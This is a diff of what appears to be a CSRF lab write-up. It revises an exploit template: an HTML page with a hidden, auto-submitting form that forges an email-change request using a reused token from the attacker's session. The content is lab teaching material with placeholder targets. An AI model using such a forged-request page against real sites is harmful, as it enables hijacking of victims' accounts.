@@ -197,24 +197,27 @@ Change the **victim's email address** by forging a request that includes:
 #### 🧪 Exploit Template
 
 ```html
+<!--
+    CSRF Lab Demonstration
+    Create a legitimate email change request and intercept it.
+    Convert the request into a CSRF proof-of-concept using the lab tooling.
+    The CSRF token used in this request must be fresh and unused.
+    Since tokens are single-use, a previously consumed token will fail validation.
+-->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>CSRF PoC — Lab 4</title>
+    <meta charset="UTF-8">
+    <title>CSRF Exploit PoC</title>
 </head>
 <body>
-  <form id="csrfForm"
-        action="http://TARGET/change-email"
-        method="POST"
-        style="display:none;">
-    <input type="hidden" name="email" value="attacker@evil.com">
-    <!-- Token stolen from attacker's own valid session -->
-    <input type="hidden" name="csrf_token" value="VALID_TOKEN_FROM_ATTACKER_SESSION">
-  </form>
-  <script>
-    document.getElementById('csrfForm').submit();
-  </script>
+    <form id="csrfForm" action="http://localhost/update-email" method="POST">
+        <input type="hidden" name="csrf" value="TOKEN_ATTACKER">
+        <input type="hidden" name="email" value="attacker@lab.com" />
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
 </body>
 </html>
 ```
